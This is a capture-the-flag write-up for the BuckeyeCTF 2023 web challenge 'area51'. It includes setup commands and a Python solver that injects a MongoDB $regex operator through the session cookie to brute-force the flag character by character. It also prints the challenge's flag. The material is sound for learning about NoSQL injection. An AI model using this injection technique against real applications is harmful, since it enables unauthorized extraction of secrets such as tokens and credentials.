# area51

## Description

> Area51 Raid Luxury Consultation Services
>
> <https://area51.chall.pwnoh.io>
>
> Downloads: dist.zip

## Flag

bctf{tH3yR3_Us1nG_Ch3M1CaS_T0_MaK3_Th3_F0gS_GAy}

## Setup

```console
root@kali:~/ctf/buckeyectf-2023/web/area51# tree dist
dist
├── area51
│   ├── index.js
│   ├── package.json
│   ├── package-lock.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── images
│   │   │   └── pardon.webp
│   │   └── js
│   │       └── submit.js
│   ├── User.js
│   └── views
│       ├── dashboard.ejs
│       └── index.ejs
├── Dockerfile
├── entrypoint.sh
├── init_users.js
└── wait_for_mongo.js

7 directories, 13 files
```

```bash
cd dist
docker build -t bctf/area51 .
docker run --name area51 --rm -p 80:80 bctf/area51
```

## Solution

There is NoSQLi vulnerability in cookie.

solver-area51.py

```python
import requests
import sys

s = requests.Session()

if len(sys.argv) == 2:
    BASE_URL = sys.argv[1]
else:
    BASE_URL = "http://localhost/"

possible = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$'(),-/:;<=>@[\\]^_`{|}~"

session = "bctf{"

# flag length is guess
for i in range(50):
    for c in possible:
        trying_session = session + c
        print(f"{trying_session}", end="\r", flush=True)

        cookie = f'session={{"token":{{"$regex":"{trying_session}.*"}}}}'

        headers = {"Cookie": cookie}

        resp = s.get(f"{BASE_URL}", headers=headers)

        if "Pardon our dust" in resp.text:
            session = trying_session
            print()

            if c == "}":
                print("end")
                exit(0)

            break
```

```console
root@kali:~/ctf/buckeyectf-2023/web/area51# python3 solver-area51.py https://area51.chall.pwnoh.io/
bctf{t
bctf{tH
(snip)
bctf{tH3yR3_Us1nG_Ch3M1CaS_T0_MaK3_Th3_F0gS_GAy}
end
```
